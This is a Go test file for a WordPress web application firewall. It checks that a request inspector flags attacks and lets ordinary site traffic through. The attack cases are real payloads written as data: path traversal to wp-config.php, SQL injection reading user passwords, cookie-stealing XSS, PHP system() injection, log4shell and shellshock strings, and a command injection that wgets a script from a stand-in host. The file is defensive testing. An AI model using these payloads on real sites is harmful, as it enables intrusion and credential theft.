package shield

import "testing"

func TestInspectCatchesAttacks(t *testing.T) {
	cases := map[string]struct {
		r    Request
		want Threat
	}{
		"traversal":              {Request{URI: "/wp-content/plugins/x/dl.php?file=../../../wp-config.php"}, ThreatTraversal},
		"encoded traversal":      {Request{URI: "/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd"}, ThreatTraversal},
		"double-encoded":         {Request{URI: "/?f=%252e%252e%252fwp-config.php"}, ThreatTraversal},
		"null byte":              {Request{URI: "/?f=shell.php%00.jpg"}, ThreatTraversal},
		"union select":           {Request{URI: "/?id=1+UNION+ALL+SELECT+1,2,user_pass+FROM+wp_users"}, ThreatSQLi},
		"comment-obfuscated":     {Request{URI: "/?id=1/**/UnIoN/**/SeLeCt/**/1"}, ThreatSQLi},
		"tautology":              {Request{URI: "/?user=admin%27%20or%20%271%27=%271"}, ThreatSQLi},
		"time-based":             {Request{URI: "/?id=1%20AND%20SLEEP(5)"}, ThreatSQLi},
		"schema dump":            {Request{URI: "/?q=select+table_name+from+information_schema.tables"}, ThreatSQLi},
		"reflected xss":          {Request{URI: "/?s=%3Cscript%3Ealert(1)%3C/script%3E"}, ThreatXSS},
		"event handler":          {Request{URI: "/?s=%3Cimg%20src=x%20onerror=alert(1)%3E"}, ThreatXSS},
		"javascript uri":         {Request{URI: "/wp-login.php?redirect_to=javascript:alert(document.cookie)"}, ThreatXSS},
		"php wrapper":            {Request{URI: "/?page=php://filter/convert.base64-encode/resource=wp-config"}, ThreatInjection},
		"php in query":           {Request{URI: "/?x=%3C?php%20system($_GET[c]);"}, ThreatInjection},
		"function call":          {Request{URI: "/?c=base64_decode(ZWNobyAx)"}, ThreatInjection},
		"system call":            {Request{URI: "/?c=system(%27id%27)"}, ThreatInjection},
		"time-based benchmark":   {Request{URI: "/?id=1+and+benchmark(5000000,md5(1))"}, ThreatSQLi},
		"redirect to js":         {Request{URI: "/wp-login.php?redirect_to=javascript:alert(1)"}, ThreatXSS},
		"log4shell in UA":        {Request{URI: "/", UA: "${jndi:ldap://evil.example/a}"}, ThreatInjection},
		"shellshock referer":     {Request{URI: "/", Referer: "() { :; }; /bin/bash -c id"}, ThreatInjection},
		"command injection":      {Request{URI: "/?host=1.1.1.1;wget%20http://evil/x.sh"}, ThreatInjection},
		"env file":               {Request{URI: "/.env"}, ThreatProbe},
		"git config":             {Request{URI: "/.git/config"}, ThreatProbe},
		"wp-config backup":       {Request{URI: "/wp-config.php.bak"}, ThreatProbe},
		"wp-config itself":       {Request{URI: "/wp-config.php"}, ThreatProbe},
		"sql dump":               {Request{URI: "/backup.sql"}, ThreatProbe},
		"phpmyadmin":             {Request{URI: "/phpmyadmin/index.php"}, ThreatProbe},
		"phpunit rce":            {Request{URI: "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"}, ThreatProbe},
		"plugin version sniff":   {Request{URI: "/wp-content/plugins/contact-form-7/readme.txt"}, ThreatProbe},
		"webshell":               {Request{URI: "/wp-content/uploads/2024/01/wso.php"}, ThreatProbe},
		"other stacks":           {Request{URI: "/login.aspx"}, ThreatProbe},
		"rest user list":         {Request{URI: "/wp-json/wp/v2/users"}, ThreatEnumeration},
		"rest route user list":   {Request{URI: "/?rest_route=/wp/v2/users/1"}, ThreatEnumeration},
		"encoded rest user list": {Request{URI: "/wp-json/wp/v2/%75sers"}, ThreatEnumeration},
		// A bad escape elsewhere must not switch decoding (and the WAF) off.
		"stray percent":        {Request{URI: "/?id=1%20UNION%20SELECT%201,2&x=%zz"}, ThreatSQLi},
		"trailing percent":     {Request{URI: "/?s=%3Cscript%3Ealert(1)%3C/script%3E&x=%"}, ThreatXSS},
		"traversal + bad":      {Request{URI: "/?page=%2e%2e%2f%2e%2e%2fetc%2fpasswd&%"}, ThreatTraversal},
		"mysql versioned":      {Request{URI: "/?id=1+/*!50000union*/+select+1"}, ThreatSQLi},
		"vertical tab":         {Request{URI: "/?id=1%20union%0bselect%201"}, ThreatSQLi},
		"author enum by tools": {Request{URI: "/?author=1", Browser: false}, ThreatEnumeration},
	}
	for name, c := range cases {
		if got := Inspect(c.r); got != c.want {
			t.Errorf("%s: Inspect(%q) = %v, want %v", name, c.r.URI, got, c.want)
		}
	}
}

// Real traffic that must never be blocked. A WAF that blocks customers gets
// switched off, which is worse than a WAF that misses an edge case.
func TestInspectAllowsRealTraffic(t *testing.T) {
	loggedIn := "wordpress_logged_in_0a1b2c=admin%7C1700000000%7Cabc; wp-settings-1=x"
	for _, r := range []Request{
		{URI: "/"},
		{URI: "/2024/05/hello-world/"},
		{URI: "/?s=solar+system+%282020%29"},
		{URI: "/?s=select+the+best+union+jacket"},
		{URI: "/?s=rock+%27n%27+roll"},
		{URI: "/?s=O%27Brien+and+sons"},
		{URI: "/shop/?orderby=price&filter_color=blue&min_price=10"},
		{URI: "/?utm_source=newsletter&utm_medium=email&utm_campaign=spring%20sale"},
		{URI: "/wp-admin/post.php?post=42&action=edit"},
		{URI: "/wp-admin/admin-ajax.php?action=heartbeat"},
		{URI: "/wp-login.php?redirect_to=https%3A%2F%2Fexample.com%2Fwp-admin%2F&reauth=1"},
		{URI: "/wp-json/wp/v2/posts?per_page=10&_embed=1"},
		{URI: "/wp-json/wp/v2/users/me?context=edit", Cookie: loggedIn},
		{URI: "/wp-json/wp/v2/users?who=authors&per_page=100", Cookie: loggedIn},
		{URI: "/?author_name=jane"},
		{URI: "/author/jane/"},
		{URI: "/wp-content/uploads/2024/01/brochure.pdf"},
		{URI: "/checkout/?wc-ajax=update_order_review"},
		{URI: "/?wc-api=wc_gateway_stripe"},
		{URI: "/robots.txt"},
		{URI: "/.well-known/security.txt"},
		{URI: "/feed/", UA: "Feedly/1.0 (+http://www.feedly.com/fetcher.html)"},
		{URI: "/", Referer: "https://www.google.com/search?q=select+union+station+hotels"},
		{URI: "/?p=123&preview=true"},
		{URI: "/?s=javascript:+the+good+parts"},
		{URI: "/?s=how+much+sleep+(8+hours)"},
		{URI: "/?s=system()+call"},
		{URI: "/?author=2", Browser: true}, // plain-permalink author link
		{URI: "/?s=100%25+cotton"},
		{URI: "/sample-page/?replytocom=12#respond"},
		{URI: "/category/news/page/2/"},
	} {
		if got := Inspect(r); got != ThreatNone {
			t.Errorf("Inspect(%q, cookie=%v) = %v; legitimate request blocked", r.URI, r.Cookie != "", got)
		}
	}
}

func TestScriptPath(t *testing.T) {
	for in, want := range map[string]string{
		"/wp-login.php":              "/wp-login.php",
		"/wp-login.php/extra/path":   "/wp-login.php",
		"/wp-login.php?action=login": "/wp-login.php",
		"//wp-admin/../wp-login.php": "/wp-login.php",
		"/%77p-login.php":            "/wp-login.php",
		"/wp-admin/":                 "/wp-admin",
		"/blog/wp-admin/options.php": "/blog/wp-admin/options.php",
		"":                           "/",
	} {
		if got := ScriptPath(in); got != want {
			t.Errorf("ScriptPath(%q) = %q, want %q", in, got, want)
		}
	}
}
